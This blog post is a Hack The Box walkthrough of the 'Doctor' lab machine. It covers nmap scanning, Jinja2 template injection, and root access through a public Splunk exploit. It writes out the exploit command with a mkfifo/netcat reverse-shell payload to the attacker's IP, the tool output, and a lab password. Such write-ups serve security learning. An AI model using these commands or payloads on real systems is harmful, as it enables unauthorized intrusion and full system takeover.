---
layout: post
title:  "Doctor Hack The Box Walkthrough"
date:   2021-02-15 15:00:00 +0530
categories: HackTheBox HTB CTF
---
Doctor is a machine in which I used Server Side Template injection to get to obtain shell access and then used enumeration and exploit vulnerable service to get root Access.

## Scanning
As always, I started scanning with Nmap

```
nmap -sV -sV 10.10.10.209
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-29 10:35 EDT
Nmap scan report for doctors.htb (10.10.10.209)
Host is up (0.17s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
8089/tcp open  ssl/http Splunkd httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.74 seconds
```
A Normal HTTP, SSH Services and service called splunkd we will look it up later.

## Important 
An Important thing to do is to add the ip and domain to /etc/hosts becuase of the host routing.
```
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.209 doctors.htb
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
## Testing
So First I tried to browse the site using the ip there is nothing important there so I got in using doctors.htb and a login page appeared!

![Username](/assets/image/010/1.png)

I made an account and logged in and started making new messages. I was susspious about three things as the machine name is "Doctor"

1. SQL Injection (Failed)
2. XXE Injection (Vulnerable but coulding get Shell)
3. Server Side Template Injection (Succeed)

Using the inspect element I found another directory 
![Username](/assets/image/010/2.png)

I tested the new messages both title and content. so found title is vulnerable to SSTI and visite /archive to execute. and found the code executed so it's Server-Side Template Injection.
![Username](/assets/image/010/3.png)

![Username](/assets/image/010/4.png)

I tried to identify the template engine and it was jinja 2. So, I started listening on netcat and added the payload to title as the pervious example and executed it as I visited /archive
```
nc -lvnp 9999
```
![Username](/assets/image/010/5.png)

## Privilege Escalation 
I ran Linpeas and found a strange thing in password in logs section 

![Username](/assets/image/010/6.png)

So, I tried to su shaun using this as a password and it worked! At this time, I was thinking about the usage of Splunkd so I started searching for exploits and found this one
[Exploit](https://github.com/DaniloCaruso/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py)

Imeditatly I downloaded it and ran it

```
python exploit.py --host 10.10.10.209 --port 8089 --lhost 10.10.14.110 --payload "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.110 1234 >/tmp/f" --username shaun --password Guitar123
Running in remote mode (Remote Code Execution)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmp5iVeZF.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.14.110:8181/
10.10.10.209 - - [29/Sep/2020 10:56:24] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!

Press RETURN to cleanup

```
And Started a listened in other netcat session

```
kali@kali:~$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.110] from (UNKNOWN) [10.10.10.209] 59218
/bin/sh: 0: can't access tty; job control turned off
# whoami
root

```
and voila here is the root privilege!






